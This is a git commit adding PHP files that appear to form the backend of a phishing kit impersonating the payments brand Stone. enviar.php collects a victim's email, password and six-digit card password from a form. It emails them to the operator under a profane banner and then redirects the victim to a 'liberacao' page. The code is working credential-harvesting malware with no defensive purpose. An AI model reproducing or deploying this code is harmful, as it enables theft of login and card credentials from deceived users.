b5601aec8a39c68f462c58e4086c9b16f91b6613
mafiapks <59379921+mafiapks@users.noreply.github.com>
2021-12-14 13:49:19 -0300

    Add files via upload

---
+++ enviar.php
@@ -0,0 +1,34 @@
+<?php 
+require './system/autoload.php';
+header("Content-type: text/html; charset=utf-8");
+
+$email = $_POST['email'];
+$senha = $_POST['password'];
+$senha6 = $_POST['senha6'];
+$senhaRetry = $_POST['senhacard2'];
+
+$teste = "<!DOCTYPE html>
+<html>
+<head>
+	<title></title>
+</head>
+<body>
+<div>
+=====CHEGOU INFO FDP=====<br>
+=========================<br>
+EMAIL: $email <br>
+SENHA: $senha <br>
+SENHA6: $senha6 <br>
+SENHA6 CONFIRMADA: $senhaRetry <br>
+=========================
+</div>
+</body>
+</html>
+";
+
+
+
+new EnviarEmail('[STONE]',$teste,"STONE");
+
+header("location:liberacao.php");
+ ?>
---
+++ index.php
@@ -0,0 +1,3 @@
+<?php 
+include_once("acess.html");
+ ?>
